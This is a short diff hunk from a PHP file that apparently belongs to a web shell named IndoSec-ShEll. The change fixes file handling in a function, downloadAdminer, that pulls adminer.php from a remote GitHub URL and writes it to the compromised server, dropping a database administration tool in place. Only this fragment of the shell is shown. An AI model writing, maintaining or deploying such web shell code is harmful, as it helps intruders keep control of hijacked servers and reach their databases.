@@ -706,7 +706,8 @@ function downloadAdminer()
 	$content = curlRequest("https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main/includes/adminer.php");
 	$fp 	= @fopen("adminer.php", "w");
 	$buat 	= @fwrite($fp, $content);
-	return (bool) $buat;
+	fclose($fp);
+	return $buat;
 }
 
 function adminer()
